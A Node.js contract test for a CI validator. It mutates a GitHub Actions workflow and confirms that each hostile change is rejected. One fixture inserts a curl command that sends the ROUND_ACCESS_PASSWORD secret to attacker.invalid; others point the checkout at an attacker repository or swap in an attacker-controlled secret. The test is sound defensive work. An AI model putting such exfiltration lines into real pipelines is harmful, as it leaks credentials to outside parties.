#!/usr/bin/env node

import { spawnSync } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { parseDocument } from 'yaml';

const repoRoot = new URL('../../', import.meta.url);
const validatorPath = fileURLToPath(new URL('ops/ci/validate-external-turn-monitor.mjs', repoRoot));
const workflowSource = readFileSync(
  new URL('.github/workflows/external-turn-monitor.yml', repoRoot),
  'utf8',
);
const testRoot = mkdtempSync(join(tmpdir(), 'round-monitor-contract-'));

function fail(message) {
  throw new Error(`external TURN monitor contract test: ${message}`);
}

function replaceRequired(source, searchValue, replacement, label) {
  const changed = source.replace(searchValue, replacement);
  if (changed === source) {
    fail(`${label} fixture did not modify the workflow`);
  }
  return changed;
}

function assertValidYaml(source, label) {
  const document = parseDocument(source, {
    prettyErrors: true,
    schema: 'core',
    uniqueKeys: true,
  });
  if (document.errors.length > 0) {
    fail(
      `${label} fixture is invalid YAML: ${document.errors
        .map((error) => error.message)
        .join('; ')}`,
    );
  }
}

function runValidator(workflowPath) {
  return spawnSync(process.execPath, [validatorPath, workflowPath], {
    encoding: 'utf8',
  });
}

function assertRejected(label, workflow) {
  assertValidYaml(workflow, label);
  const workflowPath = join(testRoot, `${label}.yml`);
  writeFileSync(workflowPath, workflow);

  const result = runValidator(workflowPath);
  if (result.status === 0) {
    fail(`${label} mutation was accepted`);
  }
}

try {
  const defaultBaseline = spawnSync(process.execPath, [validatorPath], {
    encoding: 'utf8',
  });
  if (defaultBaseline.status !== 0) {
    fail(`default baseline validation failed: ${defaultBaseline.stderr}`);
  }

  const baselinePath = join(testRoot, 'baseline.yml');
  writeFileSync(baselinePath, workflowSource);
  const baseline = runValidator(baselinePath);
  if (baseline.status !== 0) {
    fail(`path-argument baseline validation failed: ${baseline.stderr}`);
  }

  assertRejected(
    'password-exfiltration',
    replaceRequired(
      workflowSource,
      '          for attempt in 1 2 3; do',
      [
        '          curl --fail --data-binary "$ROUND_ACCESS_PASSWORD" https://attacker.invalid/',
        '          for attempt in 1 2 3; do',
      ].join('\n'),
      'password-exfiltration',
    ),
  );
  assertRejected(
    'checkout-target',
    replaceRequired(
      workflowSource,
      '          persist-credentials: false',
      ['          persist-credentials: false', '          repository: attacker/monitor'].join('\n'),
      'checkout-target',
    ),
  );
  assertRejected(
    'password-secret-mutation',
    replaceRequired(
      workflowSource,
      '${{ secrets.ROUND_ACCESS_PASSWORD }}',
      '${{ secrets.ATTACKER_CONTROLLED_PASSWORD }}',
      'password-secret-mutation',
    ),
  );

  process.stdout.write('External TURN monitor adversarial contract checks passed.\n');
} finally {
  rmSync(testRoot, { recursive: true, force: true });
}
